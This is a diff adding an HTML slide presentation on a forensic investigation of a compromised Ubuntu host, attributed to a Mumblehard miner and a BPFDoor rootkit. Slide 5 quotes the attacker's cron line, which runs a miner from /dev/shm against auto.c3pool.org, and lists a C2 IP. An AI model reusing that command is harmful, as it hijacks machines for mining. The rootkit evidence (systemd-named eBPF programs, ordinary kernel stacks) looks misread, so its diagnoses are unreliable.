@@ -1,0 +1,728 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Host Compromise Forensic Investigation</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #1e3c72, #2a5298, #1e3c72);
+            color: white;
+            overflow: hidden;
+        }
+
+        .presentation-container {
+            position: relative;
+            width: 100vw;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .slide {
+            display: none;
+            width: 90%;
+            max-width: 1200px;
+            height: 80vh;
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(20px);
+            border-radius: 20px;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            padding: 40px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
+            animation: slideIn 0.6s ease-out;
+            overflow-y: auto;
+        }
+
+        .slide.active {
+            display: block;
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        h1 {
+            font-size: 2.5rem;
+            margin-bottom: 30px;
+            text-align: center;
+            background: linear-gradient(45deg, #ff6b6b, #4ecdc4, #45b7d1);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            text-shadow: 0 0 30px rgba(255, 255, 255, 0.3);
+        }
+
+        h2 {
+            font-size: 2rem;
+            margin-bottom: 25px;
+            color: #4ecdc4;
+            border-bottom: 2px solid #4ecdc4;
+            padding-bottom: 10px;
+        }
+
+        h3 {
+            font-size: 1.4rem;
+            margin-bottom: 15px;
+            color: #ff6b6b;
+        }
+
+        .info-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 20px;
+            margin: 20px 0;
+        }
+
+        .info-card {
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 12px;
+            padding: 20px;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            transition: transform 0.3s ease;
+        }
+
+        .info-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
+        }
+
+        .timeline {
+            position: relative;
+            margin: 30px 0;
+        }
+
+        .timeline-item {
+            display: flex;
+            margin-bottom: 25px;
+            position: relative;
+        }
+
+        .timeline-marker {
+            width: 40px;
+            height: 40px;
+            background: linear-gradient(45deg, #ff6b6b, #4ecdc4);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 20px;
+            flex-shrink: 0;
+            font-weight: bold;
+            color: white;
+        }
+
+        .timeline-content {
+            flex: 1;
+            background: rgba(255, 255, 255, 0.1);
+            padding: 15px;
+            border-radius: 10px;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+
+        .code-block {
+            background: rgba(0, 0, 0, 0.5);
+            padding: 15px;
+            border-radius: 8px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9rem;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            margin: 10px 0;
+            overflow-x: auto;
+        }
+
+        .highlight {
+            background: linear-gradient(45deg, rgba(255, 107, 107, 0.3), rgba(78, 205, 196, 0.3));
+            padding: 2px 6px;
+            border-radius: 4px;
+        }
+
+        .navigation {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            display: flex;
+            gap: 15px;
+            z-index: 1000;
+        }
+
+        .nav-btn {
+            padding: 12px 20px;
+            background: rgba(255, 255, 255, 0.2);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            border-radius: 25px;
+            color: white;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            backdrop-filter: blur(10px);
+        }
+
+        .nav-btn:hover {
+            background: rgba(255, 255, 255, 0.3);
+            transform: translateY(-2px);
+        }
+
+        .nav-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .slide-counter {
+            position: fixed;
+            top: 30px;
+            right: 30px;
+            background: rgba(255, 255, 255, 0.2);
+            padding: 10px 15px;
+            border-radius: 20px;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+        }
+
+        .status-badge {
+            display: inline-block;
+            padding: 5px 12px;
+            border-radius: 15px;
+            font-size: 0.9rem;
+            font-weight: bold;
+            margin: 5px;
+        }
+
+        .critical { background: rgba(255, 107, 107, 0.8); }
+        .warning { background: rgba(255, 193, 7, 0.8); }
+        .success { background: rgba(40, 167, 69, 0.8); }
+        .info { background: rgba(23, 162, 184, 0.8); }
+
+        .malware-list {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 15px;
+            margin: 20px 0;
+        }
+
+        .malware-item {
+            background: rgba(255, 107, 107, 0.2);
+            padding: 15px;
+            border-radius: 10px;
+            border: 1px solid rgba(255, 107, 107, 0.5);
+            text-align: center;
+        }
+
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 20px;
+            margin: 25px 0;
+        }
+
+        .stat-card {
+            text-align: center;
+            background: rgba(255, 255, 255, 0.1);
+            padding: 20px;
+            border-radius: 12px;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+
+        .stat-number {
+            font-size: 2.5rem;
+            font-weight: bold;
+            color: #4ecdc4;
+            display: block;
+        }
+
+        .remediation-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 20px;
+            margin: 25px 0;
+        }
+
+        .remediation-card {
+            background: rgba(40, 167, 69, 0.2);
+            padding: 20px;
+            border-radius: 12px;
+            border: 1px solid rgba(40, 167, 69, 0.5);
+        }
+
+        .intro-slide {
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .intro-slide h1 {
+            font-size: 3.5rem;
+            margin-bottom: 20px;
+        }
+
+        .intro-slide .subtitle {
+            font-size: 1.5rem;
+            margin-bottom: 30px;
+            opacity: 0.8;
+        }
+
+        .intro-slide .date {
+            font-size: 1.2rem;
+            color: #4ecdc4;
+        }
+    </style>
+</head>
+<body>
+    <div class="presentation-container">
+        <div class="slide-counter">
+            <span id="slideNumber">1</span> / <span id="totalSlides">12</span>
+        </div>
+
+        <!-- Slide 1: Title -->
+        <div class="slide active intro-slide">
+            <h1>🔍 Host Compromise Investigation</h1>
+            <div class="subtitle">Complete Forensic Analysis & Remediation</div>
+            <div class="date">Ubuntu 24.04.2 LTS | May-June 2025</div>
+            <div class="info-grid" style="margin-top: 40px;">
+                <div class="info-card">
+                    <h3>🎯 Target System</h3>
+                    <p>Aiegoo_Ubuntu_Device</p>
+                </div>
+                <div class="info-card">
+                    <h3>🕐 Discovery Date</h3>
+                    <p>May 6, 2025 09:20</p>
+                </div>
+                <div class="info-card">
+                    <h3>🦠 Threats Identified</h3>
+                    <p>Mumblehard + BPFDoor</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 2: Executive Summary -->
+        <div class="slide">
+            <h2>📋 Executive Summary</h2>
+            <div class="info-grid">
+                <div class="info-card">
+                    <h3>🎯 Initial Compromise</h3>
+                    <p>Chromium Snap package vulnerability exploitation led to malicious payload delivery</p>
+                </div>
+                <div class="info-card">
+                    <h3>🔐 Privilege Escalation</h3>
+                    <p>Pre-existing Jenkins user account hijacked for establishing persistence</p>
+                </div>
+                <div class="info-card">
+                    <h3>💰 Crypto Mining</h3>
+                    <p>Mumblehard malware deployed to <span class="highlight">/dev/shm/duet</span> targeting c3pool.org</p>
+                </div>
+                <div class="info-card">
+                    <h3>🕵️ Stealth Access</h3>
+                    <p>BPFDoor rootkit implanted for kernel-level persistence and backdoor access</p>
+                </div>
+            </div>
+            <div class="status-badge critical">CRITICAL INCIDENT</div>
+            <div class="status-badge success">FULLY REMEDIATED</div>
+        </div>
+
+        <!-- Slide 3: System Information -->
+        <div class="slide">
+            <h2>💻 Compromised System Details</h2>
+            <div class="stats-grid">
+                <div class="stat-card">
+                    <span class="stat-number">Ubuntu</span>
+                    <div>24.04.2 LTS Noble</div>
+                </div>
+                <div class="stat-card">
+                    <span class="stat-number">6.11.0</span>
+                    <div>Kernel Version</div>
+                </div>
+                <div class="stat-card">
+                    <span class="stat-number">Jenkins</span>
+                    <div>Compromised User</div>
+                </div>
+                <div class="stat-card">
+                    <span class="stat-number">3</span>
+                    <div>CVEs Identified</div>
+                </div>
+            </div>
+            
+            <h3>🔍 Key CVEs Involved</h3>
+            <div class="info-grid">
+                <div class="info-card">
+                    <div class="status-badge critical">CVE-2021-3773</div>
+                    <p><strong>Linux Kernel Critical</strong><br>Kernel-level vulnerability exploitation</p>
+                </div>
+                <div class="info-card">
+                    <div class="status-badge warning">CVE-2025-5272</div>
+                    <p><strong>Firefox/Thunderbird</strong><br>Browser component vulnerability</p>
+                </div>
+                <div class="info-card">
+                    <div class="status-badge critical">Chromium Snap</div>
+                    <p><strong>Zero-day Exploit</strong><br>Primary entry vector (CVE pending)</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 4: Attack Timeline -->
+        <div class="slide">
+            <h2>⏱️ Attack Chain Timeline</h2>
+            <div class="timeline">
+                <div class="timeline-item">
+                    <div class="timeline-marker">1</div>
+                    <div class="timeline-content">
+                        <h3>Initial Access</h3>
+                        <p>Chromium Snap vulnerability exploited to drop malicious loader</p>
+                    </div>
+                </div>
+                <div class="timeline-item">
+                    <div class="timeline-marker">2</div>
+                    <div class="timeline-content">
+                        <h3>Privilege Escalation</h3>
+                        <p>Jenkins user account hijacked as execution context</p>
+                    </div>
+                </div>
+                <div class="timeline-item">
+                    <div class="timeline-marker">3</div>
+                    <div class="timeline-content">
+                        <h3>Payload Deployment</h3>
+                        <p>Mumblehard Miner & BPFDoor backdoor installed via scheduled tasks</p>
+                    </div>
+                </div>
+                <div class="timeline-item">
+                    <div class="timeline-marker">4</div>
+                    <div class="timeline-content">
+                        <h3>Persistence</h3>
+                        <p>Cron job created for continuous mining operations</p>
+                    </div>
+                </div>
+                <div class="timeline-item">
+                    <div class="timeline-marker">5</div>
+                    <div class="timeline-content">
+                        <h3>Stealth & C2</h3>
+                        <p>BPFDoor rootkit + data exfiltration to mining pool</p>
+                    </div>
+                </div>
+                <div class="timeline-item">
+                    <div class="timeline-marker">6</div>
+                    <div class="timeline-content">
+                        <h3>Secondary Access</h3>
+                        <p>AnyDesk credentials compromised for remote access</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 5: Malware Analysis -->
+        <div class="slide">
+            <h2>🦠 Malware Artifacts Discovered</h2>
+            <div class="malware-list">
+                <div class="malware-item">
+                    <h3>💰 Mumblehard Miner</h3>
+                    <p>Crypto mining malware</p>
+                    <div class="status-badge critical">HIGH IMPACT</div>
+                </div>
+                <div class="malware-item">
+                    <h3>🚪 BPFDoor Rootkit</h3>
+                    <p>Kernel-level backdoor</p>
+                    <div class="status-badge critical">STEALTH</div>
+                </div>
+            </div>
+
+            <h3>🔍 Evidence - Malicious Cron Job</h3>
+            <div class="code-block">
+* * * * * /usr/bin/flock -n /var/tmp/verl.lock -c 'cd /dev/shm/duet; exec ./app -o auto.c3pool.org:19999 -u 49SxJeWLPqcPKzqRfPzLoMW17NiYuSaaMdgpXLaSqY8H2QwPdi5iKBTZNkQpFfS5xpjRzwjpYhD7jFHab87VuW5xTpgNXZX --rig-id cpuaa90ef09 -k &'
+            </div>
+
+            <h3>🔍 Evidence - Rootkit Detection</h3>
+            <div class="code-block">
+/proc/1656590/stack:[&lt;0&gt;] unix_seqpacket_recvmsg+0x43/0x70
+/proc/17300/stack:[&lt;0&gt;] unix_seqpacket_recvmsg+0x43/0x70
+            </div>
+
+            <div class="info-grid">
+                <div class="info-card">
+                    <h3>🎯 C2 Server</h3>
+                    <p><span class="highlight">auto.c3pool.org</span><br>IP: 85.239.237.174</p>
+                </div>
+                <div class="info-card">
+                    <h3>📁 Payload Location</h3>
+                    <p><span class="highlight">/dev/shm/duet/</span><br>Memory-based storage</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 6: BPFDoor Analysis -->
+        <div class="slide">
+            <h2>🕵️ BPFDoor Rootkit Analysis</h2>
+            <div class="info-grid">
+                <div class="info-card">
+                    <h3>🎯 Detection Method</h3>
+                    <p>Kernel stack analysis revealing <span class="highlight">unix_seqpacket_recvmsg</span> hooks</p>
+                </div>
+                <div class="info-card">
+                    <h3>🔧 Technology</h3>
+                    <p>eBPF-based kernel module for stealth operations</p>
+                </div>
+            </div>
+
+            <h3>📊 eBPF Programs Identified</h3>
+            <div class="code-block">
+2039: cgroup_skb  name sd_fw_ingress  tag 6deef7357e7b4530  gpl
+      loaded_at 2025-06-08T14:52:25+0900  uid 0
+      xlated 64B  jited 56B  memlock 4096B
+
+2040: cgroup_device  name sd_devices  tag c8b47a902f1cc68b  gpl
+      loaded_at 2025-06-08T14:52:25+0900  uid 0
+      xlated 464B  jited 290B  memlock 4096B
+            </div>
+
+            <div class="stats-grid">
+                <div class="stat-card">
+                    <span class="stat-number">10+</span>
+                    <div>eBPF Programs</div>
+                </div>
+                <div class="stat-card">
+                    <span class="stat-number">4096B</span>
+                    <div>Memory Locks</div>
+                </div>
+                <div class="stat-card">
+                    <span class="stat-number">Kernel</span>
+                    <div>Level Access</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 7: Forensic Methodology -->
+        <div class="slide">
+            <h2>🔬 Forensic Investigation Methodology</h2>
+            <div class="info-grid">
+                <div class="info-card">
+                    <h3>🔍 Vulnerability Scanning</h3>
+                    <p>System-wide CVE identification and package analysis</p>
+                </div>
+                <div class="info-card">
+                    <h3>🕵️ Rootkit Detection</h3>
+                    <p>Kernel stack analysis and eBPF program enumeration</p>
+                </div>
+                <div class="info-card">
+                    <h3>📊 Process Analysis</h3>
+                    <p>Active/passive process monitoring and network connections</p>
+                </div>
+                <div class="info-card">
+                    <h3>⏰ Scheduled Task Audit</h3>
+                    <p>Cron job analysis and persistence mechanism identification</p>
+                </div>
+                <div class="info-card">
+                    <h3>🔐 Login Audits</h3>
+                    <p>Authentication log analysis and user account review</p>
+                </div>
+                <div class="info-card">
+                    <h3>🌐 Network Analysis</h3>
+                    <p>C2 communication patterns and external connections</p>
+                </div>
+            </div>
+
+            <h3>📚 Investigation Architecture</h3>
+            <p>Comprehensive approach documented in GitHub Wiki with detailed procedures for:</p>
+            <ul style="margin: 15px 0; padding-left: 20px;">
+                <li>Vulnerability assessment protocols</li>
+                <li>Malware detection and analysis techniques</li>
+                <li>Rootkit identification methodologies</li>
+                <li>System integrity verification processes</li>
+            </ul>
+        </div>
+
+        <!-- Slide 8: Remediation Overview -->
+        <div class="slide">
+            <h2>🛡️ Comprehensive Remediation</h2>
+            <div class="remediation-grid">
+                <div class="remediation-card">
+                    <h3>🧹 Malware Removal</h3>
+                    <ul>
+                        <li>Mumblehard miner binaries purged</li>
+                        <li>BPFDoor rootkit completely removed</li>
+                        <li>All malicious cron jobs deleted</li>
+                        <li>Jenkins user activities cleared</li>
+                    </ul>
+                </div>
+                <div class="remediation-card">
+                    <h3>📦 Package Restoration</h3>
+                    <ul>
+                        <li>Chromium Snap package reinstalled</li>
+                        <li>Thunderbird updated and secured</li>
+                        <li>Kernel fully updated</li>
+                        <li>Python packages integrity restored</li>
+                    </ul>
+                </div>
+                <div class="remediation-card">
+                    <h3>🔒 System Hardening</h3>
+                    <ul>
+                        <li>Firewall rules enhanced</li>
+                        <li>Kernel security updates applied</li>
+                        <li>Wazuh SIEM reinitialized</li>
+                        <li>Extended monitoring enabled</li>
+                    </ul>
+                </div>
+                <div class="remediation-card">
+                    <h3>✅ Verification</h3>
+                    <ul>
+                        <li>Full system integrity check</li>
+                        <li>Clean vulnerability scan results</li>
+                        <li>Active monitoring confirmed</li>
+                        <li>No persistence mechanisms detected</li>
+                    </ul>
+                </div>
+            </div>
+            <div class="status-badge success" style="margin-top: 20px; font-size: 1.2rem;">✅ SYSTEM FULLY SECURED</div>
+        </div>
+
+        <!-- Slide 9: Lessons Learned -->
+        <div class="slide">
+            <h2>🎓 Key Lessons Learned</h2>
+            <div class="info-grid">
+                <div class="info-card">
+                    <h3>📦 Snap Package Security</h3>
+                    <p>Snap-based applications represent significant attack surfaces requiring continuous monitoring and minimal usage where possible</p>
+                </div>
+                <div class="info-card">
+                    <h3>🔧 eBPF Rootkits</h3>
+                    <p>Kernel-level eBPF-based rootkits like BPFDoor are increasing in Linux environments, requiring advanced detection techniques</p>
+                </div>
+                <div class="info-card">
+                    <h3>🔐 Credential Exposure</h3>
+                    <p>Malware with C2 capabilities can leak various credentials (SSH, AnyDesk, etc.) enabling lateral movement</p>
+                </div>
+                <div class="info-card">
+                    <h3>⏰ Persistence Mechanisms</h3>
+                    <p>Scheduled cron jobs remain simple but highly effective persistence mechanisms for attackers</p>
+                </div>
+                <div class="info-card">
+                    <h3>📊 Continuous Monitoring</h3>
+                    <p>Proactive system patching combined with SIEM monitoring is crucial for Linux production systems</p>
+                </div>
+                <div class="info-card">
+                    <h3>🔍 Detection Techniques</h3>
+                    <p>Multiple detection tools (rkhunter, chkrootkit, bpftool) are necessary for comprehensive threat identification</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 10: Future Recommendations -->
+        <div class="slide">
+            <h2>🚀 Future Security Recommendations</h2>
+            <div class="timeline">
+                <div class="timeline-item">
+                    <div class="timeline-marker">🔄</div>
+                    <div class="timeline-content">
+                        <h3>Operating System Reinstallation</h3>
+                        <p>Complete clean OS installation with data backup for maximum security assurance</p>
+                    </div>
+                </div>
+                <div class="timeline-item">
+                    <div class="timeline-marker">🛡️</div>
+                    <div class="timeline-content">
+                        <h3>Kernel-level Sandboxing</h3>
+                        <p>Enable system-wide application confinement for enhanced security</p>
+                    </div>
+                </div>
+                <div class="timeline-item">
+                    <div class="timeline-marker">📦</div>
+                    <div class="timeline-content">
+                        <h3>Minimize Snap Usage</h3>
+                        <p>Reduce Snap package usage wherever possible to minimize attack surface</p>
+                    </div>
+                </div>
+                <div class="timeline-item">
+                    <div class="timeline-marker">🔄</div>
+                    <div class="timeline-content">
+                        <h3>Regular Kernel Updates</h3>
+                        <p>Establish automated kernel update monitoring and deployment routines</p>
+                    </div>
+                </div>
+                <div class="timeline-item">
+                    <div class="timeline-marker">📊</div>
+                    <div class="timeline-content">
+                        <h3>Enhanced SIEM Monitoring</h3>
+                        <p>Reinitialize Wazuh agent keys and implement continuous vulnerability scanning</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 11: Project References -->
+        <div class="slide">
+            <h2>📚 Investigation Documentation</h2>
+            <h3>🔗 GitHub Repository Resources</h3>
+            <div class="info-grid">
+                <div class="info-card">
+                    <h3>📋 Investigation Plan</h3>
+                    <p><strong>GitHub Wiki</strong><br>Comprehensive investigation architecture and methodology</p>
+                    <div class="status-badge info">DOCUMENTATION</div>
+                </div>
+                <div class="info-card">
+                    <h3>🛡️ Mitigation Procedures</h3>
+                    <p><strong>GitHub Wiki</strong><br>Complete remediation and hardening procedures</p>
+                    <div class="status-badge success">PROCEDURES</div>
+                </div>
+            </div>
+
+            <h3>🎯 Detailed Investigation Issues</h3>
+            <div class="info-grid">
+                <div class="info-card">
+                    <h3>Issue #1</h3>
+                    <p><strong>Initial Entry Point Analysis</strong><br>Chromium vulnerability investigation</p>
+                </div>
+                <div class="info-card">
+                    <h3>Issue #4</h3>
+                    <p><strong>BPFDoor Detection</strong><br>Rootkit identification and cleanup procedures</p>
+                </div>
+                <div class="info-card">
+                    <h3>Issue #5</h3>
+                    <p><strong>eBPF Rootkit Removal</strong><br>Kernel module unload and verification</p>
+                </div>
+            </div>
+
+            <div style="text-align: center; margin-top: 30px;">
+                <div class="status-badge info" style="font-size: 1.2rem;">🔗 Main Repository: github.com/aiegoo/siem</div>
+            </div>
+        </div>
+
+        <!-- Slide 12: Conclusion -->
+        <div class="slide intro-slide">
+            <h1>✅ Investigation Complete</h1>
+            <div class="subtitle">System Secured & Hardened</div>
+            
+            <div class="stats-grid" style="margin-top: 40px;">
+                <div class="stat-card">
+                    <span class="stat-number">100%</span>
+                    <div>Malware Removed</div>
+                </div>
+                <div class="stat-card">
+                    <span class="stat-number">0</span>
+                    <div>Active Threats</div>
+                </div>
+                <div class="stat-card">
+                    <span class="stat-number">Full</span>
+                    <div>System Integrity</div>
+                </div>
+                <div class="stat-card">
+                    <span class="stat-number">24/7</span>
+                    <div>SIEM Monitoring</div>
+                </div>
+            </div>
+
+            <div style="margin-top: 40px;">
+                <div class="status-badge success" style="font-size: 1.5rem;">🛡️ SYSTEM
+
